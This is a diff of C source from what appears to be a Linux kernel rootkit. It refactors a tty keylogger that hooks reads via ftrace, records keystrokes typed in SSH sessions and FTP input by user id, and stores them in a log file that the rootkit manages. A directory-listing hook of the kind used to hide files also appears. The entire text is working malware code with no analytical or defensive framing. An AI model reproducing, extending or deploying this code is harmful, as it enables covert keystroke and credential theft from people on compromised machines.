@@ -803,7 +803,10 @@ static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,
 }
 
 static LIST_HEAD(keylog_node);
-static struct file *filp;
+static struct tty_ctx tty_sys_ctx = {
+	.head = &keylog_node,
+	.fp = NULL,
+};
 
 static void __attribute__((unused)) _tty_dump(uid_t uid, pid_t pid, char *buf,
 					      ssize_t len)
@@ -812,9 +815,8 @@ static void __attribute__((unused)) _tty_dump(uid_t uid, pid_t pid, char *buf,
 }
 
 void _keylog_cleanup(void) {
-    kv_tty_close(&keylog_node);
-    fs_kernel_close_file(filp);
-    filp = NULL;
+    kv_tty_close(&tty_sys_ctx);
+    memset(&tty_sys_ctx, 0, sizeof(struct tty_ctx));
     fs_file_rm(sys_get_ttyfile());
 }
 
@@ -972,10 +974,10 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 		 */
 		if ((app_flag & APP_FTP) && rv > 1) {
 			ttybuf[strcspn(ttybuf, "\r")] = '\0';
-			kv_tty_write(uid, ttybuf, sizeof(ttybuf));
+			kv_tty_write(&tty_sys_ctx, uid, ttybuf, sizeof(ttybuf));
 		} else if (app_flag & APP_SSH &&
 			(rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
-			_key_update(uid, byte, flags);
+			kv_key_update(&tty_sys_ctx, uid, byte, flags);
 		}
 	}
 out:
@@ -1405,12 +1407,12 @@ bool sys_init(void)
 				prinfo("sys_init: ftrace hook %d on %s\n", idx,
 				       ft_hooks[idx].name);
 
-				/** Init tty log */
-				filp = kv_tty_open(&filp, sys_get_ttyfile());
-				if (!filp) {
-					prerr("sys_init: Failed loading tty file\n");
-					rc = false;
-				}
+			/** Init tty log */
+			tty_sys_ctx = kv_tty_open(&tty_sys_ctx, sys_get_ttyfile());
+			if (!tty_sys_ctx.fp) {
+				prerr("sys_init: Failed loading tty file\n");
+				rc = false;
+			}
 		}
 	}
 	return rc;
